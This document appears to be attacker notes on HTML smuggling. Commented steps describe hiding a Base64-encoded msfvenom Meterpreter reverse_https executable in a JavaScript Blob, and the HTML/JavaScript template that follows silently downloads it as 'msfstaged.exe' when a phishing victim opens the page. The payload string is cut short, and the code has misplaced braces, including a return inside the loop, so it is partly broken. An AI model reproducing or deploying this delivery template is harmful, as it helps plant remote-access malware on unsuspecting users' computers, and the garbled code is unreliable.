// With HTML Smuggling we can avoid the need for a user needing to manually click a link to download a malicious file. We can create a trigger to download the file from an embedded JavaScript file. The file is fed through and octet stream and will download the file without the user needing to click a link. When a user reads the email and clicks the link to browse the webpage the JS code will use HTML Smuggling to automatically save the dropper file.

// A Base64 Meterpreter .exe is stored as a Blob inside of a JS variable. A trigger is created via an anchor tag that will download the file once the user browses the page. 

// After generating the payload using windows/x64/meterpreter/reverse_https within msfvenom, we will Base64 encode it and create a function (base64ToArrayBuffer) that will convert it back to its original form and store it in an array. 

https://outflank.nl/blog/2018/08/14/html-smuggling-explained/
https://developer.mozilla.org/en-US/docs/Web/API/Blob


Code:

<html>
    <body>

}
		<script>  
			function base64ToArrayBuffer(base64) {
				var binary_string = window.atob(base64);  
				var len = binary_string.length;  
				var bytes = new Uint8Array( len );  
				for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i);
				return bytes.buffer;
}	
				}
				
			var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA... \\Base64 encoded payload
			var data = base64ToArrayBuffer(file);  
			var blob = new Blob([data], {type: 'octet/stream'});
			var fileName = 'msfstaged.exe';


	if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
	else {
			var a = document.createElement('a');
			document.body.appendChild(a);  
			a.style = 'display: none';  
			var url = window.URL.createObjectURL(blob);
			a.href = url;
			a.download = fileName;
			a.click();
			window.URL.revokeObjectURL(url);
}
        </script>
    </body>

</html>

















